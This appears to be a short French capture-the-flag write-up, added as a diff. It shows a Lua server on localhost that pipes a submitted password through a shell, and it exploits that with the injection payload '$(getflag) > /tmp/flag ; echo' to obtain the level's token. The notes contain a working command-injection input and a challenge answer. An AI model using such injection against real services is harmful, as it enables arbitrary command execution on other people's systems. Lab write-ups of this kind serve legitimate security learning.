@@ -1,0 +1,19 @@
+il y a un program en lua qui cree un server sur 127.0.0.1:5151
+qui demande un Password
+level11.lua
+
+le server est deja up
+$> nc localhost 5151
+Password:
+
+$> cat level10.lua
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+le server execute le mot de pass qu'on lui a envoye dans un shell
+
+on envoie en mot de passe une commande que execute getflag et stock le resultat dans le fichier /tmp/flag
+$> nc localhost 5151
+Password: $(getflag) > /tmp/flag ; echo
+
+$> cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
